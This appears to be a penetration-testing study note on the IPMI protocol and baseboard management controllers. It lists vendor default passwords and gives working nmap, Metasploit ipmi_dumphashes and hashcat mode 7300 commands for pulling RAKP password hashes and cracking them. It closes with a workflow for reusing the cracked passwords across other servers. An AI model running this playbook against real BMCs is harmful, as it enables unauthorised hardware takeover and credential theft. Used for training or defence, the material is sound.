# IPMI (UDP 623)

---

## Overview

`Intelligent Platform Management Interface` (`IPMI`) is a set of standardized specifications for **hardware-based host management** systems. It acts as an **autonomous subsystem**, working independently of the host's BIOS, CPU, firmware, and underlying operating system.

- Lets sysadmins manage/monitor systems **even when powered off or unresponsive**.
- Direct network connection to the hardware — **no OS login shell required**.
- Enables remote upgrades without physical access.
- First published by Intel in 1998; supported by 200+ vendors (Cisco, Dell, HP, Supermicro, Intel...).
- Version 2.0 adds administration via **serial over LAN** (view serial console output in-band).

|**Typical use case**|
|---|
|Before OS has booted → modify BIOS settings|
|Host fully powered down|
|Access to a host after a system failure|

Beyond those, IPMI monitors temperature, voltage, fan status, power supplies; queries inventory info; reviews hardware logs; alerts via SNMP.

> [!note] Power dependency
> The host can be off, but the IPMI module itself always needs a **power source + LAN connection** to work.

#### Components

|**Component**|**Role**|
|---|---|
|`BMC` (Baseboard Management Controller)|Micro-controller — the essential component of IPMI|
|`ICMB` (Intelligent Chassis Management Bus)|Interface permitting communication from one chassis to another|
|`IPMB` (Intelligent Platform Management Bus)|Extends the BMC|
|`IPMI Memory`|Stores system event log, repository store data, etc.|
|`Communications Interfaces`|Local system interfaces, serial/LAN interfaces, ICMB, PCI Management Bus|

## Footprinting the Service

Communicates over **UDP port 623**. Systems using IPMI are called **BMCs** — typically embedded ARM systems running Linux, connected directly to the motherboard (built-in or added as a PCI card).

- Most common BMCs in internal pentests: **HP iLO**, **Dell DRAC**, **Supermicro IPMI**
- They expose a **web-based management console**, CLI remote access (**SSH/Telnet**), and UDP 623
- ⚠️ BMC access ≈ **physical access**: monitor, reboot, power off, even reinstall the host OS

#### Nmap

```
tylapcheong@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
```

#### Metasploit — Version Scan

```
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
```

## Default Credentials

Admins frequently leave BMC default passwords unchanged — always test these first:

|**Product**|**Username**|**Password**|
|---|---|---|
|Dell iDRAC|`root`|`calvin`|
|HP iLO|`Administrator`|Randomized 8-character string: digits + uppercase letters|
|Supermicro IPMI|`ADMIN`|`ADMIN`|

Defaults may grant access to the **web console or command line** (SSH/Telnet).

## Dangerous Settings — RAKP Protocol Flaw (IPMI 2.0)

If defaults fail, abuse the RAKP flaw:

- During authentication, the server sends a **salted SHA1 or MD5 hash of the user's password to the client BEFORE authentication takes place**
- → we can obtain the password hash for **ANY valid user account** on the BMC
- Hashes are cracked **offline** via dictionary attack: **Hashcat mode `7300`**

For an HP iLO using its factory default password scheme (8 chars, uppercase letters + numbers):

```
tylapcheong@htb[/htb]$ hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

> [!warning] No direct fix exists
> The flaw is a critical component of the IPMI specification itself. Mitigations are only compensating controls:
> - Very long, difficult-to-crack passwords
> - Network segmentation rules restricting direct access to BMCs

Don't overlook IPMI during internal pentests — beyond BMC web console access (high-risk finding on its own), cracked BMC passwords are often **re-used across other systems**. Real-world example: one cracked IPMI hash → SSH into many critical servers as root + access to network monitoring tool consoles.

## Dumping Hashes

Metasploit module: `auxiliary/scanner/ipmi/ipmi_dumphashes` (IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval)

Useful options:

|**Option**|**Purpose**|
|---|---|
|`CRACK_COMMON`|Automatically cracks common passwords as they're obtained (`true`)|
|`PASS_FILE` / `USER_FILE`|Wordlists for usernames/common passwords (ships with MSF lists)|
|`OUTPUT_HASHCAT_FILE` / `OUTPUT_JOHN_FILE`|Save captured hashes directly in hashcat/john format|

```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d48...
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
```

Experimenting with different wordlists is crucial for cracking the obtained hashes. Once cracked: log in to the BMC — or if the password is unique-but-cracked, check for re-use elsewhere.

## Workflow Cheat Sheet

1. Scan UDP 623 → `nmap -sU --script ipmi-version -p 623 <target>` (or MSF `ipmi_version`)
2. Identify BMC vendor (HP iLO / Dell DRAC / Supermicro) from MAC/vendor banners
3. Test vendor default credentials against web console / SSH / Telnet
4. If defaults fail → `ipmi_dumphashes` to harvest RAKP hashes for any valid user
5. Crack offline with `hashcat -m 7300`; for HP iLO defaults use the `?1...?1 -1 ?d?u` mask
6. Leverage access: BMC full control ≈ physical access; and test the cracked password everywhere else (re-use is common)
